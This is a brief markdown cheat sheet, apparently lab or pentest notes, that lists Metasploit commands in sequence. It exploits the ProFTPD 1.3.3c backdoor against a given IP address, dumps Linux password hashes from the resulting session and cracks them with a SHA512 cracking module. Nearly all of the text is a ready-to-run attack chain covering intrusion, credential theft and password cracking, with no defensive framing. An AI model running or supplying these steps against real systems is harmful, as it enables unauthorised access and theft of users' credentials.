@@ -1,0 +1,28 @@
+### Dumps Linux Hashes & Crack IT
+
+---
+
+##### Initial access with ProFTPD 1.3.3c flaw
+
+> - msfconsole -q
+> - use exploit/unix/ftp/proftpd_133c_backdoor
+> - set RHOSTS 192.229.31.3
+> - exploit -z 
+
+NB : -z exploit & do not present us a shell 
+
+---
+
+##### Dump ALL Hashes
+
+> - use post/linux/gather/hashdump
+> - set SESSION 1
+> - exploit
+
+---
+
+##### Crack the dumped hashes to retreive password
+
+> - use auxiliary/analyze/crack_linux
+> - set SHA512 true
+> - run
